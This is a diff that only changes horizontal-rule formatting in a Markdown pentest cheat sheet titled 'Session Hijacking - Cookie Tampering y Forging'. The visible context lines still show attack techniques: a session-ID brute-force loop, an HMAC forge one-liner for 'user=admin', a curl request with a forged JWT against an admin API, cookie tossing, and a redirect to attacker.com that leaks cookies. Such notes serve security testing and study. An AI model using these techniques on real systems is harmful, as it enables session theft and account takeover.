@@ -18,7 +18,7 @@ linked:
 ---
 # Session Hijacking - Cookie Tampering y Forging
 
-***
+---
 
 ## Predictable Session IDs
 
@@ -71,7 +71,7 @@ for i in {1000..5000}; do
 done
 ```
 
-___
+---
 
 ## Weak HMAC / Signed Cookies
 
@@ -94,7 +94,7 @@ ___
 | `python3 -c "import hmac,hashlib; print(hmac.new(b'CRACKED', b'user=admin', hashlib.sha256).hexdigest())"` | Manual HMAC forge post-crack | DIY. |
 ^sh-tamper-weak-hmac
 
-___
+---
 
 ## JWT Manipulation
 
@@ -113,7 +113,7 @@ ___
 | `curl -H "Authorization: Bearer $FORGED" https://target/api/admin` | Use forged JWT | Direct exploit. |
 ^sh-tamper-jwt
 
-___
+---
 
 ## Cookie Tossing (Sub Overrides Parent)
 
@@ -132,7 +132,7 @@ ___
 | `curl -X POST -H "Host: app.target.com" -H "Cookie: session=A; session=B" https://target/` | Multiple cookies same name — browser order ambiguity | Parser confusion. |
 ^sh-tamper-tossing
 
-___
+---
 
 ## HttpOnly Bypass Tricks
 
@@ -152,4 +152,4 @@ ___
 | `<a href="https://target.com/redirect?to=//attacker.com">click</a>` (cookie leaked via Referer) | Cookie leak via Referer redirect | Referer leak. |
 ^sh-tamper-httponly-bypass
 
-***
+---
